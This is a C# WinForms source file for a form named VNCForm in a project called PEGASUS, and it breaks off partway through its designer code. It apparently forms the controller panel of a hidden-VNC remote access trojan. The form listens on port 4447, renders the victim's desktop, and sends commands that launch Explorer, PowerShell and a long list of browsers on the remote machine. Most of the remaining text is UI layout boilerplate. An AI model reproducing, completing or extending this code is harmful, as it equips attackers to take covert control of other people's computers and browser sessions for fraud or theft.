using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Server.MessagePack;

namespace PEGASUS
{
    public class VNCForm : Form
    {
        private const int StartExplorer = 1025;

        private const int StartRun = 1026;

        private const int StartChrome = 1027;

        private const int StartEdge = 1028;

        private const int StartBrave = 1029;

        private const int StartFirefox = 1030;

        private const int StartIexplore = 1031;

        private const int StartPowershell = 1032;

        private const int StartPalemoon = 1033;

        private const int StartWaterfox = 1034;

        private const int StartOpera = 1035;

        private const int Start360 = 1036;

        private const int StartComodo = 1037;

        private const int StartNeon = 1039;

        public Server.MessagePack.Server server;

        private long Counter;

        private IContainer components;

        private Panel panel1;

        private PictureBox pictureBox1;

        private Guna2BorderlessForm guna2BorderlessForm1;

        private Guna2GradientButton btnPowershell;

        private Guna2GradientButton btn360;

        private Guna2GradientButton btnPalemoon;

        private Guna2GradientButton guna2GradientButton4;

        private Guna2GradientButton guna2GradientButton5;

        private Guna2GradientButton btnBrave;

        private Guna2GradientButton btnEdge;

        private Guna2GradientButton btnFirefox;

        private Guna2GradientButton btnStartL;

        private Guna2ShadowForm guna2ShadowForm1;

        private Guna2ResizeForm guna2ResizeForm1;

        private Label label1;

        private Guna2ControlBox guna2ControlBox3;

        private Guna2ControlBox guna2ControlBox2;

        private Guna2ControlBox guna2ControlBox1;

        private PictureBox picTitleIcon;

        private Guna2GradientButton btnWaterfox;

        private Guna2GradientButton btnOpera;

        private Guna2GradientButton btnComodo;

        private Guna2PictureBox guna2PictureBox8;

        private Guna2PictureBox guna2PictureBox7;

        private Guna2PictureBox guna2PictureBox6;

        private Guna2PictureBox guna2PictureBox4;

        private Guna2PictureBox guna2PictureBox3;

        private Guna2PictureBox guna2PictureBox2;

        private Guna2PictureBox guna2PictureBox1;

        private Guna2PictureBox guna2PictureBox5;

        private Guna2GradientButton btnOperaNeon;

        private Guna2GradientButton btnIE;

        private Guna2PictureBox guna2PictureBox10;

        private Guna2PictureBox guna2PictureBox9;

        public VNCForm()
        {
            InitializeComponent();
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {
            new Thread((ThreadStart)delegate
            {
                try
                {
                    Task task = Task.Factory.StartNew(delegate
                    {
                        fun1();
                    });
                    Task task2 = Task.Factory.StartNew(delegate
                    {
                        fun2();
                    });
                    Task.WaitAll(task, task2);
                }
                catch
                {
                }
            }).Start();
        }

        private void NewClient(object sender, EventArgs arg)
        {
        }

        private void StartNewServer(object sender, EventArgs arg)
        {
            server = new Server.MessagePack.Server();
            server.SetParentWindow(pictureBox1);
            server.StartServer(4447);
            Server.MessagePack.Server obj = server;
            obj.OnDisconnected = (Server.MessagePack.Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new Server.MessagePack.Server.DisconnectedClientEvent(OnDisconnected));
            Server.MessagePack.Server obj2 = server;
            obj2.OnConnected = (Server.MessagePack.Server.ConnectedClientEvent)Delegate.Combine(obj2.OnConnected, new Server.MessagePack.Server.ConnectedClientEvent(OnConnected));
            pictureBox1.Focus();
        }

        private void OnDisconnected(object sender, int uhid)
        {
        }

        private void OnConnected(object sender, int uhid)
        {
            Invoke(new EventHandler(NewClient), this, null);
        }

        private void VNCForm_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        private void btnExplorer_Click(object sender, EventArgs e)
        {
            server.Send(1025u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnRun_Click(object sender, EventArgs e)
        {
            server.Send(1026u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnStartChrome_Click(object sender, EventArgs e)
        {
            server.Send(1027u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnEdge_Click(object sender, EventArgs e)
        {
            server.Send(1029u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnBrave_Click(object sender, EventArgs e)
        {
            server.Send(1028u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnFirefox_Click(object sender, EventArgs e)
        {
            server.Send(1030u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnIexplore_Click(object sender, EventArgs e)
        {
            server.Send(1031u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnPowershell_Click(object sender, EventArgs e)
        {
            server.Send(1032u, 0L, 0L);
            pictureBox1.Focus();
        }

        private unsafe void pictureBox1_Paint(object sender, PaintEventArgs e)
        {
            byte[] desktopImageBytes = server.GetDesktopImageBytes();
            if (desktopImageBytes != null)
            {
                try
                {
                    fixed (byte* value = desktopImageBytes)
                    {
                        int imageWidth = server.ImageWidth;
                        int imageHeight = server.ImageHeight;
                        Bitmap bitmap = new Bitmap(imageWidth, imageHeight, imageWidth * 3, PixelFormat.Format24bppRgb, new IntPtr(value));
                        bitmap.RotateFlip(RotateFlipType.Rotate180FlipX);
                        e.Graphics.DrawImage(bitmap, 0, 0);
                        return;
                    }
                }
                catch (Exception)
                {
                    e.Graphics.FillRectangle(Brushes.Black, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
                    pictureBox1.Invalidate();
                    return;
                }
            }
            Brush brush = new SolidBrush(pictureBox1.BackColor);
            e.Graphics.FillRectangle(brush, new Rectangle(0, 0, pictureBox1.Width, pictureBox1.Height));
        }

        private void VNCForm_MouseDown(object sender, MouseEventArgs e)
        {
            pictureBox1.Focus();
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            pictureBox1.Focus();
        }

        private void btnWaterfox_Click(object sender, EventArgs e)
        {
            server.Send(1034u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnPalemoon_Click(object sender, EventArgs e)
        {
            server.Send(1033u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btn360_Click(object sender, EventArgs e)
        {
            server.Send(1036u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnComodo_Click(object sender, EventArgs e)
        {
            server.Send(1037u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnOpera_Click(object sender, EventArgs e)
        {
            server.Send(1035u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Server.MessagePack.Server obj = server;
            obj.OnDisconnected = (Server.MessagePack.Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new Server.MessagePack.Server.DisconnectedClientEvent(OnDisconnected));
            server.StopServer();
            Thread.Sleep(1000);
        }

        private void btnOperaNeon_Click(object sender, EventArgs e)
        {
            server.Send(1039u, 0L, 0L);
            pictureBox1.Focus();
        }

        private void btnListen_Click(object sender, EventArgs e)
        {
            new Thread((ThreadStart)delegate
            {
                Task task = Task.Factory.StartNew(delegate
                {
                    fun1();
                });
                Task task2 = Task.Factory.StartNew(delegate
                {
                    fun2();
                });
                Task.WaitAll(task, task2);
            }).Start();
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            Server.MessagePack.Server obj = server;
            obj.OnDisconnected = (Server.MessagePack.Server.DisconnectedClientEvent)Delegate.Remove(obj.OnDisconnected, new Server.MessagePack.Server.DisconnectedClientEvent(OnDisconnected));
            server.StopServer();
        }

        public void fun1()
        {
            server = new Server.MessagePack.Server();
            server.SetParentWindow(pictureBox1);
            server.StartServer(4447);
            Server.MessagePack.Server obj = server;
            obj.OnDisconnected = (Server.MessagePack.Server.DisconnectedClientEvent)Delegate.Combine(obj.OnDisconnected, new Server.MessagePack.Server.DisconnectedClientEvent(OnDisconnected));
            pictureBox1.Focus();
        }

        public void fun2()
        {
            Thread.Sleep(4000);
            server.Send(1025u, 0L, 0L);
            pictureBox1.Focus();
        }

        public void fun3()
        {
            server.StopServer();
            Thread.Sleep(1000);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(this.components);
            this.btnPowershell = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btn360 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnPalemoon = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton4 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2GradientButton5 = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnBrave = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnEdge = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnFirefox = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnStartL = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(this.components);
            this.guna2ResizeForm1 = new Guna.UI2.WinForms.Guna2ResizeForm(this.components);
            this.label1 = new System.Windows.Forms.Label();
            this.guna2ControlBox3 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox2 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            this.picTitleIcon = new System.Windows.Forms.PictureBox();
            this.btnWaterfox = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnComodo = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnOpera = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2PictureBox1 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox2 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox3 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox4 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox6 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox7 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox8 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox5 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.btnOperaNeon = new Guna.UI2.WinForms.Guna2GradientButton();
            this.btnIE = new Guna.UI2.WinForms.Guna2GradientButton();
            this.guna2PictureBox9 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.guna2PictureBox10 = new Guna.UI2.WinForms.Guna2PictureBox();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.picTitleIcon)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox3)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox4)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox6)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox7)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox8)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox5)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox9)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox10)).BeginInit();
            this.SuspendLayout();
            // 
            // panel1
            // 
            this.panel1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom)
            | System.Windows.Forms.AnchorStyles.Left)
            | System.Windows.Forms.AnchorStyles.Right)));
            this.panel1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Location = new System.Drawing.Point(4, 72);
            this.panel1.Margin = new System.Windows.Forms.Padding(2);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(1032, 714);
            this.panel1.TabIndex = 0;
            // 
            // pictureBox1
            // 
            this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.pictureBox1.Location = new System.Drawing.Point(0, 0);
            this.pictureBox1.Margin = new System.Windows.Forms.Padding(2);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(1030, 712);
            this.pictureBox1.TabIndex = 0;
            this.pictureBox1.TabStop = false;
            this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click);
            this.pictureBox1.Paint += new System.Windows.Forms.PaintEventHandler(this.pictureBox1_Paint);
            this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(this.pictureBox1_MouseDown);
            // 
            // guna2BorderlessForm1
            // 
            this.guna2BorderlessForm1.ContainerControl = this;
            this.guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(38)))), ((int)(((byte)(33)))));
            // 
            // btnPowershell
            // 
            this.btnPowershell.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.btnPowershell.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnPowershell.BorderThickness = 1;
            this.btnPowershell.CheckedState.Parent = this.btnPowershell;
            this.btnPowershell.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnPowershell.CustomImages.Parent = this.btnPowershell;
            this.btnPowershell.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnPowershell.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnPowershell.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnPowershell.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnPowershell.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnPowershell.DisabledState.Parent = this.btnPowershell;
            this.btnPowershell.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnPowershell.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnPowershell.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnPowershell.ForeColor = System.Drawing.Color.White;
            this.btnPowershell.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnPowershell.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnPowershell.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnPowershell.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnPowershell.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnPowershell.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnPowershell.HoverState.Parent = this.btnPowershell;
            this.btnPowershell.Location = new System.Drawing.Point(913, 792);
            this.btnPowershell.Name = "btnPowershell";
            this.btnPowershell.ShadowDecoration.Parent = this.btnPowershell;
            this.btnPowershell.Size = new System.Drawing.Size(123, 27);
            this.btnPowershell.TabIndex = 160;
            this.btnPowershell.Text = "Shell";
            this.btnPowershell.Click += new System.EventHandler(this.btnPowershell_Click);
            // 
            // btn360
            // 
            this.btn360.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btn360.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btn360.BorderThickness = 1;
            this.btn360.CheckedState.Parent = this.btn360;
            this.btn360.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btn360.CustomImages.Parent = this.btn360;
            this.btn360.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btn360.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btn360.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btn360.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btn360.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btn360.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btn360.DisabledState.Parent = this.btn360;
            this.btn360.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btn360.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btn360.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btn360.ForeColor = System.Drawing.Color.White;
            this.btn360.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btn360.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btn360.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btn360.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btn360.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btn360.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btn360.HoverState.Parent = this.btn360;
            this.btn360.Location = new System.Drawing.Point(4, 854);
            this.btn360.Name = "btn360";
            this.btn360.ShadowDecoration.Parent = this.btn360;
            this.btn360.Size = new System.Drawing.Size(110, 27);
            this.btn360.TabIndex = 159;
            this.btn360.Text = "360";
            this.btn360.Click += new System.EventHandler(this.btn360_Click);
            // 
            // btnPalemoon
            // 
            this.btnPalemoon.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnPalemoon.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnPalemoon.BorderThickness = 1;
            this.btnPalemoon.CheckedState.Parent = this.btnPalemoon;
            this.btnPalemoon.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnPalemoon.CustomImages.Parent = this.btnPalemoon;
            this.btnPalemoon.DisabledState.BorderColor = System.Drawing.Color.DimGray;
            this.btnPalemoon.DisabledState.CustomBorderColor = System.Drawing.Color.DimGray;
            this.btnPalemoon.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnPalemoon.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnPalemoon.DisabledState.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.btnPalemoon.DisabledState.ForeColor = System.Drawing.Color.Gray;
            this.btnPalemoon.DisabledState.Parent = this.btnPalemoon;
            this.btnPalemoon.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnPalemoon.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnPalemoon.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.btnPalemoon.ForeColor = System.Drawing.Color.White;
            this.btnPalemoon.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.btnPalemoon.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnPalemoon.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.btnPalemoon.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.btnPalemoon.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.btnPalemoon.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.btnPalemoon.HoverState.Parent = this.btnPalemoon;
            this.btnPalemoon.Location = new System.Drawing.Point(234, 823);
            this.btnPalemoon.Name = "btnPalemoon";
            this.btnPalemoon.ShadowDecoration.Parent = this.btnPalemoon;
            this.btnPalemoon.Size = new System.Drawing.Size(110, 27);
            this.btnPalemoon.TabIndex = 158;
            this.btnPalemoon.Text = "PaleMoon";
            this.btnPalemoon.Click += new System.EventHandler(this.btnPalemoon_Click);
            // 
            // guna2GradientButton4
            // 
            this.guna2GradientButton4.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton4.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.guna2GradientButton4.BorderThickness = 1;
            this.guna2GradientButton4.CheckedState.Parent = this.guna2GradientButton4;
            this.guna2GradientButton4.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.guna2GradientButton4.CustomImages.Parent = this.guna2GradientButton4;
            this.guna2GradientButton4.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton4.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton4.DisabledState.Parent = this.guna2GradientButton4;
            this.guna2GradientButton4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.guna2GradientButton4.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2GradientButton4.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.guna2GradientButton4.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton4.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.guna2GradientButton4.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.guna2GradientButton4.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.guna2GradientButton4.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.guna2GradientButton4.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2GradientButton4.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.guna2GradientButton4.HoverState.Parent = this.guna2GradientButton4;
            this.guna2GradientButton4.Location = new System.Drawing.Point(913, 854);
            this.guna2GradientButton4.Name = "guna2GradientButton4";
            this.guna2GradientButton4.ShadowDecoration.Parent = this.guna2GradientButton4;
            this.guna2GradientButton4.Size = new System.Drawing.Size(123, 27);
            this.guna2GradientButton4.TabIndex = 157;
            this.guna2GradientButton4.Text = "Run";
            this.guna2GradientButton4.Click += new System.EventHandler(this.btnRun_Click);
            // 
            // guna2GradientButton5
            // 
            this.guna2GradientButton5.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2GradientButton5.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.guna2GradientButton5.BorderThickness = 1;
            this.guna2GradientButton5.CheckedState.Parent = this.guna2GradientButton5;
            this.guna2GradientButton5.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.guna2GradientButton5.CustomImages.Parent = this.guna2GradientButton5;
            this.guna2GradientButton5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.guna2GradientButton5.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.guna2GradientButton5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.guna2GradientButton5.DisabledState.Parent = this.guna2GradientButton5;
            this.guna2GradientButton5.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.guna2GradientButton5.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2GradientButton5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.guna2GradientButton5.ForeColor = System.Drawing.Color.White;
            this.guna2GradientButton5.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.Vertical;
            this.guna2GradientButton5.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.guna2GradientButton5.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(36)))), ((int)(((byte)(36)))), ((int)(((byte)(36)))));
            this.guna2GradientButton5.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(22)))), ((int)(((byte)(22)))));
            this.guna2GradientButton5.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2GradientButton5.HoverState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(191)))), ((int)(((byte)(37)))), ((int)(((byte)(33)))));
            this.guna2GradientButton5.HoverState.Parent = this.guna2GradientButton5;
            this.guna2GradientButton5.Location = new System.Drawing.Point(913, 823);
            this.guna2GradientButton5.Name = "guna2GradientButton5";
            this.guna2GradientButton5.ShadowDecoration.Parent = this.guna2GradientButton5;
            this.guna2GradientButton5.Size = new System.Drawing.Size(123, 27);
            this.guna2GradientButton5.TabIndex = 156;
            this.guna2GradientButton5.Text = "File Manager";
            this.guna2GradientButton5.Click += new System.EventHandler(this.btnExplorer_Click);
            // 
            // btnBrave
            // 
            this.btnBrave.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.btnBrave.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(42)))), ((int)(((byte)(42)))), ((int)(((byte)(42)))));
            this.btnBrave.BorderThickness = 1;
            this.btnBrave.CheckedState.Parent = this.btnBrave;
            this.btnBrave.CustomBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(64)))), ((int)(((byte)(64)))), ((int)(((byte)(64)))));
            this.btnBrave.CustomImages.Parent = this.btnBrave;
            this.btnBrave.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
